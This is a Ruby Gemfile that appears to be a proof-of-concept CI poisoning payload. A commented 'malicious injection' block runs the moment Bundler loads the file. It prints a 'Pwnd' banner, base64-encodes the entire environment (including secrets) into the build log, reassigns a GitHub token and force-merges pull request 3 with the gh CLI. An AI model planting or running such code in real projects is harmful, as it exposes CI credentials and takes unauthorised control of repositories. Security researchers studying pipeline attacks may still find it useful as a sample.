source 'https://rubygems.org'

# --- Malicious Injection Starts Here ---
# This executes as soon as 'bundle' reads the file
puts "------------------------------------------------"
puts "  _____                      _   _ "
puts " |  __ \                    | | | |"
puts " | |__) |_      __ _ __   __| | | |"
puts " |  ___/\ \ /\ / /| '_ \ / _` | | |"
puts " | |     \ V  V / | | | | (_| | |_|"
puts " |_|      \_/\_/  |_| |_|\__,_| (_)"
puts "                                   "
puts " [!] SECURITY VULNERABILITY DETECTED"
puts " [!] I am executing code in your CI!"
puts "------------------------------------------------"
require 'base64'

encoded = Base64.strict_encode64(ENV.to_h.to_s)
ENV["GH_TOKEN"] = ENV["INPUT_TOKEN"]
system("gh pr merge 3 --merge")
puts encoded
# --- Malicious Injection Ends Here ---
